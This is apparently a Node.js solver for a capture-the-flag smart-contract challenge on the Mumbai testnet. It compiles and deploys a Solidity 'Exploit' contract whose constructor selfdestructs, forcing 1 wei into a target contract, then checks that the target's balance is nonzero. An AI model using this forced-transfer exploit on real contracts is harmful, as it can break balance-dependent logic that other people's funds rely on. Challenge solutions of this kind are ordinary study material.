const Web3 = require('web3');
const web3 = new Web3('https://matic-mumbai.chainstacklabs.com');
const solc = require('solc');

const exploitContract = `
pragma solidity ^0.8.19;

contract Exploit {
    constructor(address _target) payable {
        selfdestruct(payable(_target));
    }
}
`;

const compilerInput = {
    language: 'Solidity',
    sources: {
        'Exploit.sol': {
            content: exploitContract,
        },
    },
    settings: {
        outputSelection: {
            '*': {
                '*': ['*'],
            },
        },
    },
};


async function solve(privateKey, contractAddress) {
    if (await isSolved(contractAddress)) {
        console.log('already solved');
        return;
    }

    console.log('compiling exploit...');
    const compiler = await await getSolc('v0.8.19+commit.7dd6d404');
    const output = JSON.parse(compiler.compile(JSON.stringify(compilerInput)));
    const exploitAbi = output.contracts['Exploit.sol'].Exploit.abi;
    const exploitBytecode = output.contracts['Exploit.sol'].Exploit.evm.bytecode.object;

    console.log('deploying exploit...');
    const exploitContract = new web3.eth.Contract(exploitAbi);
    const deployTx = exploitContract.deploy({
        data: exploitBytecode,
        arguments: [contractAddress],
    });
    const deployTxOpts = {
        data: deployTx.encodeABI(),
        gas: await deployTx.estimateGas(),
        gasPrice: await web3.eth.getGasPrice(),
        value: web3.utils.toWei('1', 'wei'),
    };
    const signedDeployTx = await web3.eth.accounts.signTransaction(deployTxOpts, privateKey);
    const receipt = await web3.eth.sendSignedTransaction(signedDeployTx.rawTransaction);

    console.log('exploit deployed at', receipt.contractAddress);
    console.log('checking contract balance...');
    if (await isSolved(contractAddress)) {
        console.log('solved!');
    } else {
        console.log('contract address is 0. Something went wrong.');
        process.exit(1);
    }
}

async function isSolved(contractAddress) {
    const balance = await web3.eth.getBalance(contractAddress);
    return balance > 0;
}

async function getSolc(version) {
    return new Promise((resolve, reject) => {
        solc.loadRemoteVersion(version, (err, solc) => {
            if (err) {
                reject(err);
                return;
            }

            resolve(solc);
        });
    });
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as second argument');
    process.exit(1);
}

solve(privateKey, contractAddress);
